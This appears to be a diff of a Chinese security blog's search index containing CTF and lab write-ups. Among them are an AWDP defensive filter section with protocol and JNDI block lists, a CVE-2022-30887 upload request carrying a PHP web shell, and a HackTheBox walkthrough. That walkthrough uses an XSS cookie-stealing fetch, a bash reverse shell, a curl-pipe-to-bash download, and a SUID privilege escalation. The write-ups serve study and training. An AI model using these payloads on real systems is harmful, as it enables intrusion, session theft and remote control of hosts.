-<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 SSRF 的自定义防护</span><br><span class="line"> 去到对应的接口下面修改即可</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebFilter;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Enumeration;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 SSRF 的自定义防护</span><br><span class="line"> @ ban 了几个协议，如果单纯全部阻挡什么 127.0.0.1，业务不一定过得去。</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">@Component</span><br><span class="line">@WebFilter(urlPatterns = &quot;/system/role/list&quot;, filterName = &quot;sqlInjectFilter&quot;)</span><br><span class="line">public class sqlFilter implements Filter &#123;</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void init(FilterConfig arg0) throws ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">        HttpServletResponse response = (HttpServletResponse) res;</span><br><span class="line">        // 获得所有请求参数名</span><br><span class="line">        Enumeration params = request.getParameterNames();</span><br><span class="line">        String sql = &quot;&quot;;</span><br><span class="line">        while (params.hasMoreElements()) &#123;</span><br><span class="line">            // 得到参数名</span><br><span class="line">            String name = params.nextElement().toString();</span><br><span class="line">            // 得到参数对应值</span><br><span class="line">            String[] value = request.getParameterValues(name);</span><br><span class="line">            for (int i = 0; i &lt; value.length; i++) &#123;</span><br><span class="line">                sql = sql + value[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (sqlValidate(sql)) &#123;</span><br><span class="line">            throw new IOException(&quot;您发送请求中的参数中含有非法字符&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 参数校验</span><br><span class="line">     * @param str</span><br><span class="line">     */</span><br><span class="line">    public static boolean sqlValidate(String str) &#123;</span><br><span class="line">        str = str.toLowerCase();//统一转为小写</span><br><span class="line">        String badStr = &quot;file|http|jar|gopher|tar|war&quot;;</span><br><span class="line">        String[] badStrs = badStr.split(&quot;\\|&quot;);</span><br><span class="line">        for (int i = 0; i &lt; badStrs.length; i++) &#123;</span><br><span class="line">            //循环检测，判断在请求参数当中是否包含SQL关键字</span><br><span class="line">            if (str.indexOf(badStrs[i]) &gt;= 0) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ruoyi.common.xss;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebFilter;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Enumeration;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 log4j2 的自定义防护</span><br><span class="line"> @ 过滤 url：在 WebFilter 当中添加 urlPatterns</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">@Component</span><br><span class="line">@WebFilter(urlPatterns = &quot;/system/role/list&quot;, filterName = &quot;sqlInjectFilter&quot;)</span><br><span class="line">public class Log4j2Filter implements Filter &#123;</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void init(FilterConfig arg0) throws ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">        HttpServletResponse response = (HttpServletResponse) res;</span><br><span class="line">        // 获得所有请求参数名</span><br><span class="line">        Enumeration params = request.getParameterNames();</span><br><span class="line">        String sql = &quot;&quot;;</span><br><span class="line">        while (params.hasMoreElements()) &#123;</span><br><span class="line">            // 得到参数名</span><br><span class="line">            String name = params.nextElement().toString();</span><br><span class="line">            // 得到参数对应值</span><br><span class="line">            String[] value = request.getParameterValues(name);</span><br><span class="line">            for (int i = 0; i &lt; value.length; i++) &#123;</span><br><span class="line">                sql = sql + value[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (sqlValidate(sql)) &#123;</span><br><span class="line">            throw new IOException(&quot;您发送请求中的参数中含有非法字符&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 参数校验</span><br><span class="line">     * @param str</span><br><span class="line">     */</span><br><span class="line">    public static boolean sqlValidate(String str) &#123;</span><br><span class="line">        str = str.toLowerCase();//统一转为小写</span><br><span class="line">        String badStr = &quot;$|$$|jndi|rmi|ldap|&#123;|&#125;|&quot;;</span><br><span class="line">        String[] badStrs = badStr.split(&quot;\\|&quot;);</span><br><span class="line">        for (int i = 0; i &lt; badStrs.length; i++) &#123;</span><br><span class="line">            //循环检测，判断在请求参数当中是否包含log4j2关键字</span><br><span class="line">            if (str.indexOf(badStrs[i]) &gt;= 0) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于文件上传的接口修改</span><br><span class="line"> @ 需要在对应接口中修改</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">public class securityUpload &#123;</span><br><span class="line">    @RequestMapping(&quot;/securityUpload&quot;)</span><br><span class="line">    public String handleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file)&#123;</span><br><span class="line">        if (file.isEmpty())&#123;</span><br><span class="line">            return &quot;请上传文件&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        // 获取文件名</span><br><span class="line">        String fileName = file.getOriginalFilename();</span><br><span class="line">        String suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;));</span><br><span class="line">        String contentType = file.getContentType();</span><br><span class="line"></span><br><span class="line">        //过滤</span><br><span class="line">        String[] picWhite = &#123;&quot;.png&quot;,&quot;.jpg&quot;,&quot;.gif&quot;,&quot;.webp&quot;,&quot;.bmp&quot;&#125;;</span><br><span class="line">        String[] white_type = &#123;&quot;image/gif&quot;,&quot;image/jpeg&quot;,&quot;image/jpg&quot;,&quot;image/png&quot;&#125;;</span><br><span class="line">        Boolean SuffixFlag = false;</span><br><span class="line">        Boolean TypeFlag = false;</span><br><span class="line">        for (String pic_suffix:picWhite)&#123;</span><br><span class="line">            if (suffix.toLowerCase().equals(pic_suffix))&#123;</span><br><span class="line">                SuffixFlag = true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        for (String white_suffix:white_type)&#123;</span><br><span class="line">            if (contentType.toLowerCase().equals(white_suffix))&#123;</span><br><span class="line">                TypeFlag = true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!SuffixFlag||!TypeFlag)&#123;</span><br><span class="line">            return &quot;File Type not allow&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String filePath = System.getProperty(&quot;user.dir&quot;)+&quot;/tmp&quot;;</span><br><span class="line"></span><br><span class="line">        Date date = new Date();</span><br><span class="line">        SimpleDateFormat dateFormat = new SimpleDateFormat(&quot;yyyyMMddhhmmss&quot;);</span><br><span class="line">        String newfileName = dateFormat.format(date)+Integer.toHexString((int)new Date().getTime())+suffix;</span><br><span class="line"></span><br><span class="line">        File dest = new File(filePath+File.separator+newfileName);</span><br><span class="line">        if (!dest.getParentFile().exists())&#123;</span><br><span class="line">            dest.getParentFile().mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line">        try&#123;</span><br><span class="line">            file.transferTo(dest);</span><br><span class="line">            return &quot;上传成功&quot;;</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            return &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package FastjsonFilters;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.util.Objects;</span><br><span class="line">import java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 Fastjson 的自定义防护</span><br><span class="line"> @ 针对 1.2.24 版本，则只添加过滤即可，若针对其他版本</span><br><span class="line"> ParserConfig.getGlobalInstance().setAutoTypeSupport(false); 将 autoTypeSupprt 设置为 false</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">public class Fastjson1224Filter &#123;</span><br><span class="line">    public String Unserjson(@RequestParam String str, @RequestParam String input) throws Exception &#123;</span><br><span class="line">        if (str != null &amp;&amp; Objects.hashCode(str) == secret.getKey().hashCode() &amp;&amp; !secret.getKey().equals(str)) &#123;</span><br><span class="line">            String pattern = &quot;.*rmi.*|.*jndi.*|.*ldap.*|.*\\\\x.*&quot;;</span><br><span class="line">            Pattern p = Pattern.compile(pattern, 2);</span><br><span class="line">            boolean StrMatch = p.matcher(input).matches();</span><br><span class="line">            if (StrMatch) &#123;</span><br><span class="line">                return &quot;Hacker get out!!!&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">            JSON.parseObject(input);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><h3 id="自定义过滤关键词-2"><a href="#自定义过滤关键词-2" class="headerlink" title="自定义过滤关键词"></a>自定义过滤关键词</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filterList := []string&#123;&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;&#125;</span><br><span class="line">str := &quot;ana&quot; // 匹配包含&quot;ana&quot;的字符串</span><br><span class="line">for _, s := range filterList &#123;</span><br><span class="line">    if strings.Contains(s, str) &#123;</span><br><span class="line">        fmt.Println(&quot;Hacker!&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="防御修复"><a href="#防御修复" class="headerlink" title="防御修复"></a>防御修复</h1><p>如果要求把要修补的文件上传到服务器里，替换原来服务器中的文件，所以我们要知道文件具体的路径，大概思路就是在根目录下查找该漏洞对应的文件路径，然后把我们修复的上传即可</p>
-<h2 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv -f explorer.php $(dirname `find / -name &#x27;explorer.php&#x27; 2&gt;/dev/null`)/explorer.php</span><br></pre></td></tr></table></figure>
-
-<p>用find命令从根目录查找名为<code>explorer.php</code>的文件，然后返回他的路径名<code>dirname</code>，<code>2&gt;/dev/null</code>的作用是避免返回一些错误的信息，比如说查找过程中会返回权限不足等错误。</p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://5ime.cn/awdp.html">https://5ime.cn/awdp.html</a></p>
-<p><a href="https://blog.csdn.net/weixin_51614272/article/details/125527593">https://blog.csdn.net/weixin_51614272/article/details/125527593</a></p>
-]]></content>
-      <categories>
-        <category>CTF比赛</category>
-      </categories>
-      <tags>
-        <tag>AWDP</tag>
       </tags>
   </entry>
   <entry>
@@ -574,28 +574,6 @@
       </categories>
   </entry>
   <entry>
-    <title>CVE-2022-30887</title>
-    <url>/article/CVE-2022-30887.html</url>
-    <content><![CDATA[<p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的，该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞</p>
-<span id="more"></span>
-
-<h1 id="CVE-2022-30887"><a href="#CVE-2022-30887" class="headerlink" title="CVE-2022-30887"></a>CVE-2022-30887</h1><p>打开题目，利用社工手段得到用户密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email：mayuri.infospace@gmail.com</span><br><span class="line">password：mayurik</span><br></pre></td></tr></table></figure>
-
-<p>登陆成功后找到文件上传点</p>
-<p><img src="/article/CVE-2022-30887/image-20240413113616413.png"></p>
-<p>不过这里的洞被修复了，然后找到我们可以修改存在的药品图片</p>
-<p><img src="/article/CVE-2022-30887/image-20240413123550782.png"></p>
-<p>发包即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /php_action/editProductImage.php?id=1 HTTP/1.1</span><br><span class="line">Host: eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------190811817834681586072859788548</span><br><span class="line">Content-Length: 489</span><br><span class="line">Origin: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com/editproduct.php?id=1</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1712973768; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1712981784; googtrans=/en/zh-CN; PHPSESSID=fk5vtlalgr7ok0d8dce8l6emof; googtrans=/en/zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;old_image&quot;</span><br><span class="line"></span><br><span class="line">tab.jpg</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;productImage&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php system($_POST[1]);?&gt;</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;btn&quot;</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548--</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>春秋云镜</category>
-        <category>漏洞复现</category>
-      </categories>
-  </entry>
-  <entry>
     <title>CVE-2022-32991</title>
     <url>/article/CVE-2022-32991.html</url>
     <content><![CDATA[<p>该CMS的welcome.php中存在SQL注入攻击</p>
@@ -617,88 +595,26 @@
       </categories>
   </entry>
   <entry>
-    <title>Headless-HackTheBox</title>
-    <url>/article/Headless-HackTheBox.html</url>
-    <content><![CDATA[<p>XSS跨站脚本攻击、sh脚本提权</p>
+    <title>CVE-2022-30887</title>
+    <url>/article/CVE-2022-30887.html</url>
+    <content><![CDATA[<p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的，该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞</p>
 <span id="more"></span>
 
-<h1 id="Headless-HackTheBox"><a href="#Headless-HackTheBox" class="headerlink" title="Headless-HackTheBox"></a>Headless-HackTheBox</h1><p>信息搜集</p>
-<p>使用nmap扫描一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.8</span><br></pre></td></tr></table></figure>
+<h1 id="CVE-2022-30887"><a href="#CVE-2022-30887" class="headerlink" title="CVE-2022-30887"></a>CVE-2022-30887</h1><p>打开题目，利用社工手段得到用户密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email：mayuri.infospace@gmail.com</span><br><span class="line">password：mayurik</span><br></pre></td></tr></table></figure>
 
-<p><img src="/article/Headless-HackTheBox/image-20240331155537558.png"></p>
-<p>可以发现5000端口是开放的，继续扫一下目录</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331163111975.png"></p>
-<p>访问<code>/dashboard</code>发现只有admin才可以，我们注意到cookie值为JWT加密，拿到揭秘网站验证下猜想</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331173230979.png"></p>
-<p>cookie为user用户，那么我们要想访问必须拿到admin的cookie</p>
-<p>访问<code>/support</code>路径存在类似提交留言的功能，应该是存在xss注入。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>登陆成功后找到文件上传点</p>
+<p><img src="/article/CVE-2022-30887/image-20240413113616413.png"></p>
+<p>不过这里的洞被修复了，然后找到我们可以修改存在的药品图片</p>
+<p><img src="/article/CVE-2022-30887/image-20240413123550782.png"></p>
+<p>发包即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /php_action/editProductImage.php?id=1 HTTP/1.1</span><br><span class="line">Host: eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------190811817834681586072859788548</span><br><span class="line">Content-Length: 489</span><br><span class="line">Origin: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com/editproduct.php?id=1</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1712973768; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1712981784; googtrans=/en/zh-CN; PHPSESSID=fk5vtlalgr7ok0d8dce8l6emof; googtrans=/en/zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;old_image&quot;</span><br><span class="line"></span><br><span class="line">tab.jpg</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;productImage&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php system($_POST[1]);?&gt;</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;btn&quot;</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548--</span><br></pre></td></tr></table></figure>
 
-<p>提交后会发现提示Hacking</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331172458874.png"></p>
-<p>说明思路没错，那么我们可以利用xss注入得到admin的cookie值，payload如下</p>
-<p>（利用fetch函数对我们服务器发送网络请求）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=1 onerror=fetch(&quot;http://10.10.14.34:80/?cookie=&quot;+document.cookie);&gt;</span><br></pre></td></tr></table></figure>
-
-<p>经过多次尝试，发现我触发payload的条件必须在<code>User-Agent</code>和<code>message</code>参数都有才行。而国外师傅们不同wp中<code>User-Agent</code>都是payload触发点，但是message参数值的不同。有的是下图这样而有的是<code>message=test;</code></p>
-<p><img src="/article/Headless-HackTheBox/image-20240331172008225.png"></p>
-<p>不过好在是拿到了admin的cookie</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331171946128.png"></p>
-<p>成功访问<code>/dashboard</code>，然后抓包发现data参数存在命令注入</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331174558986.png"></p>
-<p>尝试直接反弹shell发现不行，那么试一下用curl命令</p>
-<ol>
-<li><p>首先在本地创建shell.sh文件，写入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.34/1028 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>然后在本地开启http服务，用来被靶机读取文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>然后用curl命令去读取我们的shell.sh文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date=;curl 10.10.14.34/shell.sh |bash</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>成功反弹shell</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331175715080.png"></p>
-<p>得到user的flag</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331175800113.png"></p>
-<p>我们尝试用sudo提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-
-<p>发现只有<code>/usr/bin/syscheck</code>可用</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331180740517.png"></p>
-<p>我们strings命令查看下得到源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">if [ &quot;$EUID&quot; -ne 0 ]; then</span><br><span class="line">  exit 1</span><br><span class="line">last_modified_time=$(/usr/bin/find /boot -name &#x27;vmlinuz*&#x27; -exec stat -c %Y &#123;&#125; + | /usr/bin/sort -n | /usr/bin/tail -n 1)</span><br><span class="line">formatted_time=$(/usr/bin/date -d &quot;@$last_modified_time&quot; +&quot;%d/%m/%Y %H:%M&quot;)</span><br><span class="line">/usr/bin/echo &quot;Last Kernel Modification Time: $formatted_time&quot;</span><br><span class="line">disk_space=$(/usr/bin/df -h / | /usr/bin/awk &#x27;NR==2 &#123;print $4&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;Available disk space: $disk_space&quot;</span><br><span class="line">load_average=$(/usr/bin/uptime | /usr/bin/awk -F&#x27;load average:&#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;System load average: $load_average&quot;</span><br><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
-
-<p>重点看下面这段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
-
-<p>这段代码大概意思就是，if语句先使用pgrep命令检测<code>initdb.sh</code>是否存在，如果不存在则执行该sh文件并丢弃错误输出</p>
-<p>而我们在根目录下并没有找到该sh文件，那么我们可以简单利用一下</p>
-<ol>
-<li><p>首先创建<code>initdb.sh</code>文件，写入提升权限的命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;chmod u+s /bin/bash&quot; &gt; initdb.sh</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>然后赋予该sh脚本的执行权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x initdb.sh</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>最后sudo执行<code>/usr/bin/syscheck</code>，成功运行sh脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/syscheck</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p><img src="/article/Headless-HackTheBox/image-20240331181954932.png"></p>
-<p>运行sh脚本后，用-p参数启动<code>Bash Shell</code>并以特权模式运行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -p</span><br></pre></td></tr></table></figure>
-
-<p>得到root的flag</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331182210478.png"></p>
 ]]></content>
       <categories>
-        <category>渗透</category>
+        <category>春秋云镜</category>
+        <category>漏洞复现</category>
       </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>提权</tag>
-      </tags>
   </entry>
   <entry>
     <title>Clicker-HackTheBox</title>
@@ -821,9 +737,93 @@
       </tags>
   </entry>
   <entry>
+    <title>Headless-HackTheBox</title>
+    <url>/article/Headless-HackTheBox.html</url>
+    <content><![CDATA[<p>XSS跨站脚本攻击、sh脚本提权</p>
+<span id="more"></span>
+
+<h1 id="Headless-HackTheBox"><a href="#Headless-HackTheBox" class="headerlink" title="Headless-HackTheBox"></a>Headless-HackTheBox</h1><p>信息搜集</p>
+<p>使用nmap扫描一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.8</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Headless-HackTheBox/image-20240331155537558.png"></p>
+<p>可以发现5000端口是开放的，继续扫一下目录</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331163111975.png"></p>
+<p>访问<code>/dashboard</code>发现只有admin才可以，我们注意到cookie值为JWT加密，拿到揭秘网站验证下猜想</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331173230979.png"></p>
+<p>cookie为user用户，那么我们要想访问必须拿到admin的cookie</p>
+<p>访问<code>/support</code>路径存在类似提交留言的功能，应该是存在xss注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>提交后会发现提示Hacking</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331172458874.png"></p>
+<p>说明思路没错，那么我们可以利用xss注入得到admin的cookie值，payload如下</p>
+<p>（利用fetch函数对我们服务器发送网络请求）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=1 onerror=fetch(&quot;http://10.10.14.34:80/?cookie=&quot;+document.cookie);&gt;</span><br></pre></td></tr></table></figure>
+
+<p>经过多次尝试，发现我触发payload的条件必须在<code>User-Agent</code>和<code>message</code>参数都有才行。而国外师傅们不同wp中<code>User-Agent</code>都是payload触发点，但是message参数值的不同。有的是下图这样而有的是<code>message=test;</code></p>
+<p><img src="/article/Headless-HackTheBox/image-20240331172008225.png"></p>
+<p>不过好在是拿到了admin的cookie</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331171946128.png"></p>
+<p>成功访问<code>/dashboard</code>，然后抓包发现data参数存在命令注入</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331174558986.png"></p>
+<p>尝试直接反弹shell发现不行，那么试一下用curl命令</p>
+<ol>
+<li><p>首先在本地创建shell.sh文件，写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.34/1028 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后在本地开启http服务，用来被靶机读取文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后用curl命令去读取我们的shell.sh文件</p>
